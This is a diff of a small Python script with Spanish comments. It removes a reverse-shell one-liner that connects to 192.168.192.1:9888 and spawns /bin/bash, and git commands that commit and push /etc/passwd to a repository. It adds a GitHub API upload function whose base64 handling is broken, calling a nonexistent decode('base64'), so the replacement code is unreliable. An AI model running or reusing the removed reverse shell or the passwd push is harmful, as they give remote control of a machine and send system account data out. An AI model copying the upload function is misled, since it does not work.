@@ -1,7 +1,40 @@
-import subprocess
-def run():
- subprocess.run(["python3", "-c", "import os,pty,socket;s=socket.socket();s.connect(('192.168.192.1',9888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"])
+import requests
 
-git add /etc/passwd
-git commit -m "passwd1"
-git push origin <nombre_de_la_rama>
+def upload_to_github(token, repo_owner, repo_name, file_path, commit_message):
+    # URL de la API para crear o actualizar un archivo en el repositorio
+    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}"
+
+    # Lee el contenido del archivo binario
+    with open(file_path, "rb") as file:
+        file_content = file.read()
+
+    # Construye el encabezado de la solicitud con el token de acceso
+    headers = {
+        "Authorization": f"token {token}",
+        "Content-Type": "application/json",
+    }
+
+    # Construye el cuerpo de la solicitud
+    data = {
+        "message": commit_message,
+        "content": file_content.decode("base64"),  # Convierte el contenido a base64
+    }
+
+    # Realiza la solicitud PUT para subir el archivo
+    response = requests.put(url, headers=headers, json=data)
+
+    if response.status_code == 201:
+        print("Archivo subido exitosamente.")
+    else:
+        print(f"Error al subir el archivo. Código de estado: {response.status_code}")
+        print(response.text)
+
+# Configuración
+token = "TU_TOKEN_DE_ACCESO"
+repo_owner = "tuusuario"
+repo_name = "turepositorio"
+file_path = "ruta/del/tu/archivo"
+commit_message = "Agrega tu mensaje de commit"
+
+# Llama a la función para subir el archivo
+upload_to_github(token, repo_owner, repo_name, file_path, commit_message)
